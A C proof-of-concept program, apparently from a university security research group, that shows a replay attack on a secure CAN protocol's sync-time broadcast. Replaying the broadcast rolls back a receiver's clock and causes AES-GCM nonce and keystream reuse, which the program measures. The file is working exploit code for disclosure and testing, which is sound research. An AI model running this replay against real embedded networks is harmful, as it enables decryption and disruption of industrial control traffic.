/*
 * Copyright (c) 2026
 *
 * Hochschule Offenburg, University of Applied Sciences
 * Institute for reliable Embedded Systems
 * and Communications Electronic (ivESK)
 *
 * This file is licensed as described in the "LICENSE" file
 * included within the root folder of this work.
 */

/* Proof of concept: demonstrates sync time broadcast replay attack. */
#include "../../spsec_participant/session_loops_internal.h"
#include "crypto.h"
#include "keys.h"
#include "messages.h"
#include "participant.h"
#include "participant_keys.h"
#include "spsec_common.h"
#include "utils_bytes.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define SYNC_BROADCAST_ADDR (0x02210000u | ((uint32_t)CPMT_SYNC << 8))
#define TPDO_ADDR 0x181u

/* Captured outbound frames. */
typedef struct {
  uint32_t address;
  uint64_t ts;
  uint8_t ct[64];
  size_t ct_len;
  uint8_t fill; /* plaintext byte, set by the sender below */
} Captured;
#define MAX_FRAMES 1024
static Captured g_frames[MAX_FRAMES];
static int g_nframes;

signed char __wrap_participant_channel_send_spapp_data(SPsecCommChannel *channel_ptr,
                                                       SPsecAppData *msg_ptr) {
  (void)channel_ptr;
  if (g_nframes < MAX_FRAMES) {
    Captured *c = &g_frames[g_nframes++];
    c->address = msg_ptr->address;
    c->ts = bytes_to_u64_le(msg_ptr->timestamp);
    c->ct_len = msg_ptr->secure_data_len;
    memcpy(c->ct, msg_ptr->secure_data_ptr, c->ct_len);
  }
  return 0;
}

static void init_node(Participant *p) {
  memset(p, 0, sizeof(*p));
  p->participant_id = 7;
  p->crypto_algorithm = CRYPTO_ALGO_AES_GCM;
  crypto_handler_init(&p->crypto_handler);
  crypto_handler_select_algorithm(&p->crypto_handler, p->crypto_algorithm);
  communication_keys_init(&p->comm_keys);
  timer_init(&p->timer, 8);
  uint8_t seed[KEY_LEN];
  for (int i = 0; i < KEY_LEN; i++)
    seed[i] = (uint8_t)(0x30 + i);
  p->comm_keys.spsec_keys[3] = spseckey_new(0x44444444, seed);
  uint8_t salt[SALT_LEN] = {0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7};
  p->comm_keys.spsec_salt[3] = (SPsecSalt *)malloc(sizeof(SPsecSalt));
  spsecsalt_init(p->comm_keys.spsec_salt[3], salt);
  uint8_t csalt[4] = {0x11, 0x22, 0x33, 0x44};
  communication_keys_set_csalt(&p->comm_keys, csalt);
}

/* Wire bytes of the Sync Time broadcast the Sync sends at timer value ts. */
typedef struct {
  uint8_t ct[10];
  uint8_t tag[AUTH_TAG_SIZE];
  uint8_t trailer[8];
} Broadcast;

static Broadcast sync_broadcast(Participant *sync, uint64_t ts) {
  Broadcast b;
  memset(&b, 0, sizeof(b));
  uint8_t ts_le[8];
  u64_to_bytes_le(ts, ts_le);
  communication_keys_update(&sync->comm_keys, ts_le);
  uint8_t *key = sync->comm_keys.use_odd_key ? sync->comm_keys.odd_key
                                             : sync->comm_keys.even_key;
  uint8_t nonce[REQUIRED_NONCE_LEN] = {0};
  memcpy(nonce, ts_le, 8);
  nonce[8] = (uint8_t)(SYNC_BROADCAST_ADDR & 0xFF);
  nonce[9] = (uint8_t)((SYNC_BROADCAST_ADDR >> 8) & 0xFF);
  memcpy(nonce + 10, sync->comm_keys.spsec_salt[3]->salt, 6);
  uint8_t aad[DATA_AAD_LEN] = {
      (uint8_t)(SYNC_BROADCAST_ADDR & 0xFF), (uint8_t)((SYNC_BROADCAST_ADDR >> 8) & 0xFF),
      (uint8_t)((SYNC_BROADCAST_ADDR >> 16) & 0xFF),
      (uint8_t)((SYNC_BROADCAST_ADDR >> 24) & 0xFF), TIMESTAMP_SIZE + 2};
  uint8_t pt[TIMESTAMP_SIZE + 2] = {0};
  u64_to_bytes_le(ts, pt);
  crypto_handler_set_context(&sync->crypto_handler, key, nonce, 12, AUTH_TAG_SIZE);
  crypto_handler_encrypt_with_assoc_data(&sync->crypto_handler, pt, sizeof(pt), b.ct,
                                         b.tag, aad, sizeof(aad));
  uint16_t hdr = (uint16_t)(ts & 0x0FFF);
  b.trailer[0] = (uint8_t)(hdr & 0xFF);
  b.trailer[1] = (uint8_t)(hdr >> 8);
  return b;
}

static signed char deliver(Participant *rx, const Broadcast *b) {
  SPsecAppData *ad = spsecappdata_new(SYNC_BROADCAST_ADDR, (uint8_t *)b->ct, sizeof(b->ct),
                                      0, (uint8_t *)b->trailer, (uint8_t *)b->tag,
                                      AUTH_TAG_SIZE);
  SPsecSyncTimeBroadcastMessage *m = spsecsynctimebroadcast_new(0);
  m->spsec_app_data_ptr = ad;
  signed char r = participant_handle_timesync_broadcast(rx, m);
  spsecsynctimebroadcast_free(m);
  return r;
}

static uint64_t clock_of(Participant *p) {
  uint8_t b[8];
  timer_get_timestamp(&p->timer, b);
  return bytes_to_u64_le(b);
}

static void send_pdo(Participant *p, uint8_t fill) {
  uint8_t data[8];
  memset(data, fill, sizeof(data));
  AppData *ad = appdata_new(TPDO_ADDR, data, sizeof(data));
  int idx = g_nframes;
  participant_handle_secure_message(p, ad);
  if (idx < g_nframes)
    g_frames[idx].fill = fill;
  appdata_free(ad);
}

/* Cyclic TPDO: one frame per ms for n ms. */
static void send_cyclic(Participant *p, int n, uint8_t first_fill) {
  struct timespec period = {0, 1000 * 1000};
  for (int i = 0; i < n; i++) {
    send_pdo(p, (uint8_t)(first_fill + i));
    nanosleep(&period, NULL);
  }
}

int main(void) {
  configure_logging("CRITICAL");
  Participant sync, rx;
  init_node(&sync);
  init_node(&rx);

  const uint64_t T0 = 0x05800000ULL + 1000ULL;
  uint8_t t0_le[8];
  u64_to_bytes_le(T0, t0_le);
  timer_set_timestamp(&rx.timer, t0_le); /* initial Parameter Authentication */

  Broadcast recorded = sync_broadcast(&sync, T0); /* attacker records it */
  if (deliver(&rx, &recorded) != 0) {
    puts("setup failed: legitimate broadcast rejected");
    return 2;
  }
  send_cyclic(&rx, 150, 0x00); /* ~150 ms of normal traffic */
  int first_phase = g_nframes;
  uint64_t before = clock_of(&rx);

  signed char replay = deliver(&rx, &recorded); /* attacker replays */
  uint64_t after = clock_of(&rx);
  send_cyclic(&rx, 150, 0x80); /* traffic continues after the rollback */

  int collisions = 0, keystream_reused = 0;
  for (int i = 0; i < first_phase; i++) {
    for (int j = first_phase; j < g_nframes; j++) {
      if (g_frames[i].address != g_frames[j].address || g_frames[i].ts != g_frames[j].ts)
        continue;
      collisions++;
      int same = 1;
      for (size_t b = 0; b < 8; b++)
        if ((uint8_t)(g_frames[i].ct[b] ^ g_frames[j].ct[b]) !=
            (uint8_t)(g_frames[i].fill ^ g_frames[j].fill))
          same = 0;
      keystream_reused += same;
    }
  }

  printf("replayed broadcast:       %s\n", replay == 0 ? "ACCEPTED" : "rejected");
  printf("receiver clock:           %llu -> %llu (%+lld ticks)\n",
         (unsigned long long)before, (unsigned long long)after, (long long)(after - before));
  printf("frames sent:              %d before, %d after\n", first_phase,
         g_nframes - first_phase);
  printf("(CAN ID, timer) reused:   %d frame pairs\n", collisions);
  printf("ct1 ^ ct2 == pt1 ^ pt2:   %d of those pairs (AES-GCM keystream reuse)\n",
         keystream_reused);

  communication_keys_destroy(&rx.comm_keys);
  communication_keys_destroy(&sync.comm_keys);
  return (replay == 0 && after < before) ? 1 : 0; /* 1 = rollback reproduced */
}
